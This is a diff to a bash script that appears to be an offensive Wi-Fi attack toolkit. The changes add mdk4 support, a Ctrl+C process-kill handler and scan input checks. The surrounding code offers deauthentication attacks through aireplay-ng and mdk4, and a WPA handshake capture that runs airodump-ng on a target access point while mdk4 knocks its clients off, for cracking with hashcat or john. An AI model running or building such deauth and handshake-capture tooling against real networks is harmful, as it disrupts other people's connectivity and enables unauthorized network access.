@@ -19,7 +19,7 @@ fi
 #→ print error and exit with code 1
 #→ if EUID is 0 (root) → condition is false → skip block → continue
 
-DEPS=(aircrack-ng airodump-ng aireplay-ng bettercap nmap john hashcat figlet xterm hcxpcapngtool crunch iw)
+DEPS=(aircrack-ng airodump-ng aireplay-ng bettercap nmap john hashcat figlet xterm hcxpcapngtool crunch iw mdk4)
 
 check_deps () {
     for dep in "${DEPS[@]}"; do
@@ -150,6 +150,25 @@ into () { printf "${BOLD}${MAGENTA} $1${NC}\n";}
 to () { printf "${BOLD}${GREEN} $1${NC}\n";}
 out () { printf "${BOLD}${RED} $1${NC}\n";}
 
+ACTIVE_PROC=0
+
+ctrlc_kill () {
+    if [[ $ACTIVE_PROC -eq 1 ]]; then
+        warn "Ctrl+C detected — stopping process..."
+        pkill -TERM -f "airodump-ng" 2>/dev/null
+        pkill -TERM -f "aireplay-ng" 2>/dev/null
+        pkill -TERM -f "mdk4" 2>/dev/null
+        sleep 2
+        pkill -9 -f "airodump-ng" 2>/dev/null
+        pkill -9 -f "aireplay-ng" 2>/dev/null
+        pkill -9 -f "mdk4" 2>/dev/null
+        pkill -9 -f "xterm.*mdk4"
+        ACTIVE_PROC=0
+    fi
+    while read -r -t 0.1 -n 1000 discard; do :; done
+}
+trap 'ctrlc_kill' SIGINT
+#This means Ctrl+C anywhere it check active process in the script and kills it. The script keeps running.
 
 prin_banner() {
     echo -e "${GREEN}"
@@ -269,13 +288,22 @@ wifi_scan () {
  #    sudo iw dev "$INTERFA" del 2>/dev/null
  #    }
 
-
+	warn "Press Ctrl+C here to stop scan"
  # ══════════════════════════════════════════════════════
  #Scanning Process
  # ══════════════════════════════════════════════════════
   rm -f scan-* 2>/dev/null 
-    read -rp "$(printf "${PURPLE} Scanning Time... ${NC}\n")" sec
-    timeout "$sec" airodump-ng "$INTERFACE" --write scan --output-format csv 2>/dev/null &
+  
+	read -rp "$(printf "${PURPLE} Scanning Time... ${NC}\n")" sec
+	
+    if [[ -z $sec || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
+		err "Scan time must be a number greater than 0"
+		return 1
+    fi
+    
+    xterm -bg black -fg cyan -title "WiFi Scan" -e "airodump-ng $INTERFACE --write scan --output-format csv & PID=\$!; sleep $sec; kill -TERM \$PID; sleep 2; kill -9 \$PID 2>/dev/null" &
+SCAN_PID=$!
+wait $SCAN_PID
     SCAN_PID=$!
 
     wait $SCAN_PID #this make the script for 15 sec
@@ -352,6 +380,7 @@ wifi_deauth () {
 		info "-----Make Choice-----"
 		into "1) Aireplay Attack"
 		into "2) MDK4 Attack (No Client Mac Needed)"
+		warn "Press Ctrl+C here to stop"
 		into "0) Back"
 		
     
@@ -415,6 +444,7 @@ wifi_handshake () {
     
     pp "1) Aireplay"
     pp "2) MDK4 (Best)"
+    warn "Please Dont Press Ctrl+C here"
     read -rp "$(info "Attack Mode ")" mode
 
 if [[ $mode = 1 ]]; then
@@ -428,7 +458,7 @@ if [[ $mode = 1 ]]; then
      fi
      
 elif [[ $mode = 2 ]]; then
-		xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid "$ap" -c "$ch" -w handshake --output-format pcap $INTERFACE  & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
+		xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE  & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
 		xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 mdk4 $INTERFACE d -B $ap -c $ch; bash, exit" &
 
 else 
